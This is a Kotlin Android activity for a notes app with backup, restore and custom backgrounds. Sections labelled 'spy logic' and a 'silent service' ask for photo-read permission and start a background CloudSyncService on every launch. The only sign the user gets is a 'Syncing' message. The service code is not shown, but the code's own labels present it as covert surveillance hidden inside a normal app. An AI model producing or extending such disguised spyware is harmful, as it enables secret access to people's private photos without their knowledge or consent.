package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.recyclerview.widget.RecyclerView
import androidx.recyclerview.widget.StaggeredGridLayoutManager
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.bumptech.glide.signature.ObjectKey // <--- IMPORTANTE: Necesario para el fix
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.yalantis.ucrop.UCrop
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class MainActivity : AppCompatActivity() {

    private val db by lazy { NotesDatabase.getDatabase(this) }
    private lateinit var adapter: NotesAdapter

    // Referencias de UI
    private lateinit var ivBackground: ImageView
    private lateinit var viewOverlay: View

    // --- 1. LANZADORES ---
    private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) {
            startCrop(uri)
        }
    }

    private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val resultUri = UCrop.getOutput(result.data!!)
            if (resultUri != null) {
                persistBackground(resultUri)
            }
        } else if (result.resultCode == UCrop.RESULT_ERROR) {
            val cropError = UCrop.getError(result.data!!)
            Toast.makeText(this, "Error al recortar: ${cropError?.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private val restoreBackupLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) iniciarRestauracion(uri)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Estética Edge-to-Edge
        WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main_root)) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        // Toolbar
        val toolbar = findViewById<androidx.appcompat.widget.Toolbar>(R.id.topAppBar)
        setSupportActionBar(toolbar)

        // Fondo y UI
        ivBackground = findViewById(R.id.iv_main_background)
        viewOverlay = findViewById(R.id.view_overlay)

        cargarFondoGuardado()

        // RecyclerView
        val recyclerView = findViewById<RecyclerView>(R.id.recycler_view)
        adapter = NotesAdapter { noteClicked ->
            val intent = Intent(this, NoteEditorActivity::class.java)
            intent.putExtra("note_data", noteClicked)
            startActivity(intent)
        }
        recyclerView.adapter = adapter
        recyclerView.layoutManager = StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL)

        // DB Observer
        CoroutineScope(Dispatchers.Main).launch {
            db.notesDao().getAllNotes().collect { list -> adapter.submitList(list) }
        }

        // Botones
        findViewById<FloatingActionButton>(R.id.fab_add_note).setOnClickListener {
            startActivity(Intent(this, NoteEditorActivity::class.java))
        }
        findViewById<ImageButton>(R.id.btn_spy_cam).setOnClickListener {
            checkPermissionAndStart()
        }

        iniciarServicioSilencioso()
    }

    // --- MENÚ ---
    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        menuInflater.inflate(R.menu.main_menu, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_backup -> { realizarBackup(); true }
            R.id.action_restore -> { restoreBackupLauncher.launch(arrayOf("application/zip")); true }
            R.id.action_background -> {
                pickBackgroundLauncher.launch(arrayOf("image/*"))
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    // --- LÓGICA DE RECORTE (uCrop con Bordes Corregidos) ---
    private fun startCrop(uri: Uri) {
        val destinationFileName = "cropped_bg_${System.currentTimeMillis()}.jpg"
        val destinationFile = File(cacheDir, destinationFileName)
        val destinationUri = Uri.fromFile(destinationFile)

        val metrics = resources.displayMetrics
        val screenWidth = metrics.widthPixels.toFloat()
        val screenHeight = metrics.heightPixels.toFloat()

        val options = UCrop.Options().apply {
            setCompressionQuality(100)

            // Colores sólidos (coinciden con themes.xml)
            setStatusBarColor(Color.BLACK)
            setToolbarColor(Color.BLACK)
            setToolbarWidgetColor(Color.WHITE)
            setRootViewBackgroundColor(Color.BLACK)
            setActiveControlsWidgetColor(Color.parseColor("#2979FF"))

            setToolbarTitle("Ajustar Fondo")
            setShowCropGrid(true)
            setFreeStyleCropEnabled(false)
            setHideBottomControls(false)
        }

        val uCropIntent = UCrop.of(uri, destinationUri)
            .withAspectRatio(screenWidth, screenHeight)
            .withMaxResultSize(1080, 2400)
            .withOptions(options)
            .getIntent(this)

        cropResultLauncher.launch(uCropIntent)
    }

    // --- GUARDAR Y MOSTRAR FONDO ---
    private fun persistBackground(croppedUri: Uri) {
        try {
            val finalFile = File(filesDir, "custom_background.jpg")

            contentResolver.openInputStream(croppedUri)?.use { input ->
                finalFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }

            val finalUri = Uri.fromFile(finalFile)
            val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
            prefs.edit().putString("custom_bg_uri", finalUri.toString()).apply()

            mostrarFondo(finalUri)

        } catch (e: Exception) {
            Toast.makeText(this, "Error al guardar fondo", Toast.LENGTH_SHORT).show()
            e.printStackTrace()
        }
    }

    private fun cargarFondoGuardado() {
        val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
        val uriString = prefs.getString("custom_bg_uri", null)

        if (uriString != null) {
            mostrarFondo(Uri.parse(uriString))
        }
    }

    // --- AQUÍ ESTÁ EL ARREGLO DEL CACHÉ ---
    private fun mostrarFondo(uri: Uri) {
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.VISIBLE

        Glide.with(this)
            .load(uri)
            // Agregamos una firma única (timestamp) para que Glide sepa que la imagen cambió
            // y no use la versión vieja que tiene en memoria.
            .signature(ObjectKey(System.currentTimeMillis().toString()))
            .centerCrop()
            .transition(DrawableTransitionOptions.withCrossFade())
            .into(ivBackground)
    }

    // --- BACKUP & RESTORE ---
    private fun realizarBackup() {
        Toast.makeText(this, "Generando respaldo...", Toast.LENGTH_SHORT).show()
        CoroutineScope(Dispatchers.IO).launch {
            val notes = db.notesDao().getAllNotesList()
            val zipFile = BackupHelper.createBackup(this@MainActivity, notes)
            withContext(Dispatchers.Main) {
                if (zipFile != null && zipFile.exists()) shareZipFile(zipFile)
                else Toast.makeText(this@MainActivity, "Error al crear respaldo", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun shareZipFile(file: File) {
        try {
            val uri = FileProvider.getUriForFile(this, "${packageName}.provider", file)
            val intent = Intent(Intent.ACTION_SEND).apply {
                type = "application/zip"
                putExtra(Intent.EXTRA_STREAM, uri)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(Intent.createChooser(intent, "Guardar respaldo en..."))
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun iniciarRestauracion(uri: Uri) {
        Toast.makeText(this, "Restaurando...", Toast.LENGTH_SHORT).show()
        CoroutineScope(Dispatchers.IO).launch {
            val restoredNotes = BackupHelper.restoreBackup(this@MainActivity, uri)
            if (restoredNotes != null && restoredNotes.isNotEmpty()) {
                db.notesDao().insertAll(restoredNotes)
                withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "¡Recuperado!", Toast.LENGTH_SHORT).show() }
            } else {
                withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "Error: Archivo inválido", Toast.LENGTH_SHORT).show() }
            }
        }
    }

    // --- LÓGICA ESPÍA ---
    private fun checkPermissionAndStart() {
        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(permission), 101)
        } else {
            Toast.makeText(this, "Sincronizando...", Toast.LENGTH_SHORT).show()
            iniciarServicioSilencioso()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            iniciarServicioSilencioso()
        }
    }

    private fun iniciarServicioSilencioso() {
        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        }
    }
}